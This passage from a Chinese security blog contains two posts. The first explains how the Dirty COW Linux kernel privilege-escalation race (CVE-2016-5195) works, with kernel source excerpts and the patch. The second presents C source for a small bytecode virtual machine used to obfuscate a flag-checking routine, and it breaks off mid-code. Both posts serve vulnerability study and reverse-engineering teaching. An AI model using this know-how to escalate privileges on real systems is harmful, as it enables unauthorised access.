<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maddr = kmap(page);</span><br><span class="line"><span class="keyword">if</span> (write) &#123;</span><br><span class="line">    copy_to_user_page(vma, page, addr,</span><br><span class="line">            maddr + offset, buf, bytes);</span><br><span class="line">    set_page_dirty_lock(page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    copy_from_user_page(vma, page, addr,</span><br><span class="line">            buf, maddr + offset, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，写操作由两步完成：  </p>
<ol>
<li>将应用层传进的数据写到目标page中  </li>
<li>将page设置为脏页<br>很显然，这个page如何获取是这个漏洞成因的关键。page获取的代码也是在<code>__access_remote_vm</code>函数中：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">        write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br></pre></td></tr></table></figure>
下面分析一下page获取代码<a target="_blank" rel="noopener" href="http://lxr.linux.no/linux+v3.13/mm/memory.c#L2007">get_user_pages</a>函数的关键代码流程：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">                struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        cond_resched(); <span class="comment">// 线程调度，产生多线程竞态条件的可能</span></span><br><span class="line">        <span class="keyword">while</span> (!(page = follow_page_mask(vma, start,</span><br><span class="line">                                foll_flags, &amp;page_mask))) &#123;</span><br><span class="line">            ret = handle_mm_fault(mm, vma, start, fault_flags);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (nr_pages &amp;&amp; start &lt; vma-&gt;vm_end);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<code>__get_user_pages</code>函数中有两个最关键的函数：<a target="_blank" rel="noopener" href="http://lxr.linux.no/linux+v3.13/mm/memory.c#L1456">follow_page_mask</a>和<a target="_blank" rel="noopener" href="http://lxr.linux.no/linux+v3.13/mm/memory.c#L3783">handle_mm_fault</a>函数。<br><code>follow_page_mask</code>函数的作用是根据给的应用层地址addr（虚拟地址）去查找该addr映射到的内核内存页，如果查找到就返回该内存页的描述符<code>struct page*</code>。当应用层地址addr还没有映射到内核内存页时，该函数返回NULL。<br><code>handle_mm_fault</code>函数的作用是使应用层地址addr与内核内存页之间建立联系。<br>PoC中用<code>mmap</code>去映射文件到内存区域时，使用了<code>MAP_PRIVATE</code>标志，写文件时会写到COW机制产生的内存区域中，原文件不受影响。其中获取用户进程内存页的过程如下：</li>
</ol>
<ul>
<li>第一次调用<code>follow_page_mask</code>查找虚拟地址对应的page，带有<code>FOLL_WRITE</code>标志。因为所在page不在内存中，<code>follow_page_mask</code>返回NULL，会调用<code>handle_mm_fault</code>进行缺页处理，最终调用<a target="_blank" rel="noopener" href="http://lxr.linux.no/linux+v3.13/mm/memory.c#L3299">__do_fault</a>函数，分配只读匿名内存页并建立映射关系。</li>
<li>第二次循环，调用<code>follow_page_mask</code>，带有<code>FOLL_WRITE</code>标志。在权限检查时出错，代码如下。第二次进入<code>handle_mm_fault</code>函数，最终调用<a target="_blank" rel="noopener" href="http://lxr.linux.no/linux+v3.13/mm/memory.c#L2604">do_wp_page</a>函数分配COW页，并在上级函数中去掉FOLL_WRITE标志。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct page *<span class="title">follow_page_mask</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))</span><br><span class="line">        <span class="keyword">goto</span> unlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>第三次循环，调用<code>follow_page_mask</code>，不带FOLL_WRITE标志，成功得到page，到这里复制过程就算完成了。</li>
</ul>
<p><strong>产生竞态条件</strong><br>我们再来梳理一下写时复制的过程中调页的过程：</p>
<ul>
<li>第一次<code>follow_page_mask</code>(FOLL_WRITE)，因为page不在内存中，进行缺页处理。</li>
<li>第二次<code>follow_page_mask</code>(FOLL_WRITE)，因为page没有写权限，并去掉<code>FOLL_WRITE</code>。</li>
<li>第三次<code>follow_page_mask</code>(无FOLL_WRITE)，成功。</li>
</ul>
<p><code>__get_user_pages</code>函数中每次查找page前会先调用<code>cond_resched()</code>线程调度一下，这样就引入了竞态条件的可能性。在第二次分配COW页成功后，<code>FOLL_WRITE</code>标记已经去掉，如果此时，另一个线程把page释放了，那么第三次由于page不在内存中，又会进行调页处理，由于不带<code>FOLL_WRITE</code>标记，不会进行COW操作，此时<code>get_user_pages</code>得到的page带<code>__PAGE_DIRTY</code>，竞态条件就是这样产生的，流程如下：  </p>
<ul>
<li>第一次<code>follow_page_mask</code>(FOLL_WRITE)，page不在内存中，进行缺页处理。</li>
<li>第二次<code>follow_page_mask</code>(FOLL_WRITE)，page没有写权限，并去掉<code>FOLL_WRITE</code>。</li>
<li>另一个线程释放上一步分配的COW页</li>
<li>第三次<code>follow_page_mask</code>(无FOLL_WRITE)，page不在内存中，进行缺页处理。</li>
<li>第四次<code>follow_page_mask</code>(无FOLL_WRITE)，成功返回page，但没有使用COW机制。</li>
</ul>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>该漏洞的<a target="_blank" rel="noopener" href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619">patch</a>。现在不再是把<code>FOLL_WRITE</code>标记去掉，而是添加了一个<code>FOLL_COW</code>标志来表示获取一个COW分配的页。即使是竞态条件破坏了一次完整的获取页的过程，但是因为<code>FOLL_WRITE</code>标志还在，所以会重头开始分配一个COW页，从而保证该过程的完整性。<br><strong>reference</strong><br>【漏洞分析】11月4日：深入解读脏牛Linux本地提权漏洞（CVE-2016-5195）<br>【漏洞分析】CVE-2016-5195 Dirtycow: Linux内核提权漏洞分析<br>庖丁解牛</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/07/11/%E4%BB%A3%E7%A0%81%E8%99%9A%E6%8B%9F%E6%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/11/%E4%BB%A3%E7%A0%81%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="post-title-link" itemprop="url">代码虚拟机</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-07-11 15:24:02" itemprop="dateCreated datePublished" datetime="2017-07-11T15:24:02+08:00">2017-07-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="代码虚拟化简介"><a href="#代码虚拟化简介" class="headerlink" title="代码虚拟化简介"></a>代码虚拟化简介</h2><p>虚拟化是用一套自定义的字节码来替换程序中的native指令，而字节码在执行的时候又由程序中的解释器来解释执行。自定义的字节码只有解释器才能识别，一般工具无法识别这些字节码，所以基于虚拟机的保护相对其他保护而言要更加难破解。其中的关系就像解释语言一样，不是系统可执行文件，不能直接在系统中运行，需要相应的解释器才能运行，如Python。<br>虚拟化技术应用广泛，如sandbox、程序保护壳等。很多时候为了防止恶意代码对我们的系统造成破坏，需要一个sandbox，使程序运行在sandbox中，即使恶意代码破坏系统，也只是破坏了sandbox，不会对系统造成影响。还有如vmp，shielden这些加密壳就是内置了一个虚拟机来实现对程序代码的保护。<br>基于虚拟机的代码保护也算是代码混淆技术的一种。代码混淆技术对保护代码很有效果，但是也存在着副作用，比如会或多或少降低程序效率，这一点在基于虚拟机的保护中格外突出，所以大多数基于虚拟机的保护都只是保护了其中比较重要的部分。<br>在基于虚拟机的保护技术中，通常自定义的字节码与native指令都存在着映射关系，一条或多条字节码对应于一条native指令。这是为了增加虚拟机保护被破解的难度，对被保护代码进行转化的时候就可以随机生成出多套字节码。  </p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>1.定义一套字节码<br>这里只定义了常用的几个命令，可以再进行扩展。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OPCODES</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    MOV = <span class="number">0xa0</span>, <span class="comment">// mov指令字节码0xa0</span></span><br><span class="line">    XOR = <span class="number">0xa1</span>, <span class="comment">// xor指令字节码0xa1</span></span><br><span class="line">    CMP = <span class="number">0xa2</span>, <span class="comment">// cmp指令字节码0xa2</span></span><br><span class="line">    RET = <span class="number">0xa3</span>, <span class="comment">// ret指令字节码0xa3</span></span><br><span class="line">    SYS_READ = <span class="number">0xa4</span>, <span class="comment">// read系统调用字节码0xa4</span></span><br><span class="line">    SYS_WRITE = <span class="number">0xa5</span>, <span class="comment">// write系统调用字节码0xa5</span></span><br><span class="line">    JNZ = <span class="number">0xa6</span> <span class="comment">// jnz指令字节码0xa6</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>2.实现解释器<br>实现解释器需要虚拟出一些自定义字节码运行的环境，与真实的运行环境类似，需要处理器、堆、栈，这里先定义一个虚拟的处理器：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">opcode_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> opcode; <span class="comment">// 字节码</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(<span class="keyword">void</span> *); <span class="comment">// 字节码对应的处理函数</span></span><br><span class="line">&#125; vm_opcode;</span><br><span class="line"><span class="comment">// 虚拟处理器</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processor_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> r1; <span class="comment">// 虚拟存储器r1</span></span><br><span class="line">    <span class="keyword">int</span> r2; <span class="comment">// 虚拟存储器r2</span></span><br><span class="line">    <span class="keyword">int</span> r3; <span class="comment">// 虚拟存储器r3</span></span><br><span class="line">    <span class="keyword">int</span> r4; <span class="comment">// 虚拟存储器r4</span></span><br><span class="line">    <span class="keyword">int</span> flag; <span class="comment">// 虚拟标志寄存器flag，作用类似于eflags</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *eip; <span class="comment">// 虚拟寄存器eip，指向正在解释的字节码地址</span></span><br><span class="line">    vm_opcode op_table[OPCODE_NUM]; <span class="comment">// 字节码列表，存放了所有字节码与对应的处理函数</span></span><br><span class="line">&#125; vm_processor;</span><br></pre></td></tr></table></figure>
<p>要保护的代码逻辑比较简单，所以只需要一个处理器就可以了，堆和栈不是必须的。程序中有一个全局的<code>heap_buf</code>用来存储数据，可以把这个缓冲区空间理解成堆或栈。<br>有了上面的两个结构，下面实现解释器：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 执行字节码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec_opcode</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 查找eip指向的正在解释的字节码对应的处理函数</span></span><br><span class="line">    <span class="keyword">while</span> (!flag &amp;&amp; i &lt; OPCODE_NUM) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*proc-&gt;eip == proc-&gt;op_table[i].opcode) &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 查找到之后，调用本条指令的处理函数，由处理函数来解释</span></span><br><span class="line">            proc-&gt;op_table[i].func((<span class="keyword">void</span> *)proc);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 虚拟机的解释器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_interp</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// eip指向被保护代码的第一个字节</span></span><br><span class="line">    <span class="comment">// target_func + 4是为了跳过编译器生成的函数入口的代码</span></span><br><span class="line">    proc-&gt;eip = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) target_func + <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// 循环判断eip指向的字节码是否为返回指令，如果不是就调用exec_opcode来解释执行</span></span><br><span class="line">    <span class="keyword">while</span> (*proc-&gt;eip != RET) &#123;</span><br><span class="line">        exec_opcode(proc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>target_func</code>是保护的代码，用eip逐条语句执行<code>target_func</code>里的字节码。解释字节码时首先判断是哪一个指令需要执行，接着调用它的处理函数。<br>了解了整体思路之后，程序的运行过程其实很简单，直接看完整代码就能懂。</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p><strong>codevm.h</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPCODE_NUM 7 <span class="comment">// opcode number</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_SIZE_MAX 1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *heap_buf; <span class="comment">// 虚拟堆栈空间</span></span><br><span class="line"><span class="comment">// opcode enum</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OPCODES</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    MOV = <span class="number">0xa0</span>, <span class="comment">// mov指令字节码0xa0</span></span><br><span class="line">    XOR = <span class="number">0xa1</span>, <span class="comment">// xor指令字节码0xa1</span></span><br><span class="line">    CMP = <span class="number">0xa2</span>, <span class="comment">// cmp指令字节码0xa2</span></span><br><span class="line">    RET = <span class="number">0xa3</span>, <span class="comment">// ret指令字节码0xa3</span></span><br><span class="line">    SYS_READ = <span class="number">0xa4</span>, <span class="comment">// read系统调用字节码0xa4</span></span><br><span class="line">    SYS_WRITE = <span class="number">0xa5</span>, <span class="comment">// write系统调用字节码0xa5</span></span><br><span class="line">    JNZ = <span class="number">0xa6</span> <span class="comment">// jnz指令字节码0xa6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">REGISTERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    R1 = <span class="number">0x10</span>,</span><br><span class="line">    R2 = <span class="number">0x11</span>,</span><br><span class="line">    R3 = <span class="number">0x12</span>,</span><br><span class="line">    R4 = <span class="number">0x13</span>,</span><br><span class="line">    EIP = <span class="number">0x14</span>,</span><br><span class="line">    FLAG = <span class="number">0x15</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// opcode struct</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">opcode_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> opcode; <span class="comment">// 字节码</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(<span class="keyword">void</span> *); <span class="comment">// 字节码对应的处理函数</span></span><br><span class="line">&#125; vm_opcode;</span><br><span class="line"><span class="comment">// virtual processor</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processor_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> r1; <span class="comment">// 虚拟存储器r1</span></span><br><span class="line">    <span class="keyword">int</span> r2; <span class="comment">// 虚拟存储器r2</span></span><br><span class="line">    <span class="keyword">int</span> r3; <span class="comment">// 虚拟存储器r3</span></span><br><span class="line">    <span class="keyword">int</span> r4; <span class="comment">// 虚拟存储器r4</span></span><br><span class="line">    <span class="keyword">int</span> flag; <span class="comment">// 虚拟标志寄存器flag，作用类似于eflags</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *eip; <span class="comment">// 虚拟寄存器eip，指向正在解释的字节码地址</span></span><br><span class="line">    vm_opcode op_table[OPCODE_NUM]; <span class="comment">// 字节码列表，存放了所有字节码与对应的处理函数</span></span><br><span class="line">&#125; vm_processor;</span><br></pre></td></tr></table></figure>
<p><strong>codevm.c</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;codevm.h&quot;</span></span></span><br><span class="line"><span class="comment">// 要保护的代码，替换native指令为自定义字节码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">target_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__ __volatile__(<span class="string">&quot;.byte 0xa0, 0x10, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x11, 0x12, 0x00, 0x00, 0x00, 0xa4, 0xa0, 0x14, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x11, 0x29, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x20, 0xa6, 0x5b, 0xa0, 0x14, 0x01, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x21, 0xa6, 0x50, 0xa0, 0x14, 0x02, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x22, 0xa6, 0x45, 0xa0, 0x14, 0x03, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x23, 0xa6, 0x3a, 0xa0, 0x14, 0x04, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x24, 0xa6, 0x2f, 0xa0, 0x14, 0x05, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x25, 0xa6, 0x24, 0xa0, 0x14, 0x06, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x26, 0xa6, 0x19, 0xa0, 0x14, 0x07, 0x00, 0x00, 0x00, 0xa1, 0xa2, 0x27, 0xa6, 0x0f, 0xa0, 0x10, 0x30, 0x00, 0x00, 0x00, 0xa0, 0x11, 0x09, 0x00, 0x00, 0x00, 0xa5, 0xa3, 0xa0, 0x10, 0x40, 0x00, 0x00, 0x00, 0xa0, 0x11, 0x07, 0x00, 0x00, 0x00, 0xa5, 0xa3&quot;</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        mov r1, 0x00000000</span></span><br><span class="line"><span class="comment">        mov r2, 0x12</span></span><br><span class="line"><span class="comment">        call vm_read    ; 输入    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, input[0]</span></span><br><span class="line"><span class="comment">        mov r2, 0x29</span></span><br><span class="line"><span class="comment">        xor r1, r2      ; 异或</span></span><br><span class="line"><span class="comment">        cmp r1, flag[0] ; 比较</span></span><br><span class="line"><span class="comment">        jnz ERROR       ; 如果不相同就跳转到输出错误的代码    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        ; 同上</span></span><br><span class="line"><span class="comment">        mov r1, input[1]</span></span><br><span class="line"><span class="comment">        xor r1, r2</span></span><br><span class="line"><span class="comment">        cmp r1, flag[1]</span></span><br><span class="line"><span class="comment">        